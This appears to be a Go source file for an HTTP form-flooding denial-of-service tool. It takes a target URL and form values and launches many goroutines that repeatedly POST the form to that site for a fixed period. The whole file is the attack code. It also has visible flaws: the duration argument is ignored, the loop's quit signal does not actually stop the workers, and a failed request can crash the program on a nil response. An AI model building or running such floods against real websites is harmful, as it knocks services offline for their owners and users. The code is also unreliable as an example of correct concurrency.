package dos

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"time"
)

type ch struct {
	starter chan struct{}
	quitter chan struct{}
	sync    chan int
}

// TargetInf - struct for webaddress and formnames
type TargetInf struct {
	webaddress string
	formnames  url.Values
}

var (
	channelStruct ch
	infoIntern    TargetInf
)

// AddWebaddress - Add webaddress to TargetInf struct
func (inf *TargetInf) AddWebaddress(webAddress string) string {
	inf.webaddress = webAddress
	return inf.webaddress
}

// AddForm - Add formname to TargetInf struct
func (inf *TargetInf) AddForm(formName string, formValue string) url.Values {
	if inf.formnames == nil {
		inf.formnames = url.Values{}
	}
	inf.formnames.Add(formName, formValue)
	return inf.formnames
}

// Make - initialize the internal Values struct.
func (inf *TargetInf) Make() url.Values {
	inf.formnames = url.Values{}
	return inf.formnames
}

func makeRequest(sync chan<- uint8) {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	resp, err := http.PostForm(infoIntern.webaddress, infoIntern.formnames)
	if err != nil {
		fmt.Println(err)
	}

	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
		fmt.Printf("%10d | HTTP Status is in the 2xx range : %s\n", r.Uint32(), infoIntern.webaddress)
	} else {
		fmt.Printf("%10d | Argh! Broken : %s\n", r.Uint32(), infoIntern.webaddress)
	}

	sync <- 0
}

func runner() {
	<-channelStruct.starter // Starting routine on receive
	sync := make(chan uint8)
	for {
		select {
		case <-channelStruct.quitter: // Quit routine on receive
			break
		default:
			go makeRequest(sync)
			_ = <-sync
		}
	}
}

func start(n int) {
	for i := 1; i < n+1; i++ {
		fmt.Printf("Starting routine: %d\n", i)
		go runner()
	}
	close(channelStruct.starter)
	status := 0
	channelStruct.sync <- status
}

func quit() {
	close(channelStruct.quitter)
	time.Sleep(5 * time.Second)
	status := 0
	channelStruct.sync <- status
}

func buildingDataAndCh(info TargetInf) {
	channelStruct.starter = make(chan struct{})
	channelStruct.quitter = make(chan struct{})
	channelStruct.sync = make(chan int)

	infoIntern = info // Build global struct
}

// Run function - returns error or nil
func Run(threads int, timeInSeconds int, info TargetInf) (err error) {
	var status int            // Status variable for error management
	var runTime time.Duration // variable for runtime management

	runTime = 8 * time.Second

	buildingDataAndCh(info) // build the datastructure from TargetInf struct and initialize channels

	go start(threads)             // start routines
	status = <-channelStruct.sync // Wait for start routine
	if status < 0 {
		err = fmt.Errorf("error in start() routine of package formdos")
		return err
	}

	time.Sleep(runTime) // Let the routines work for the given duration

	go quit()                     // quit routines
	status = <-channelStruct.sync // Wait for quit routine
	if status < 0 {
		err = fmt.Errorf("error in quit() routine of package formdos")
		return err
	}

	return nil

}
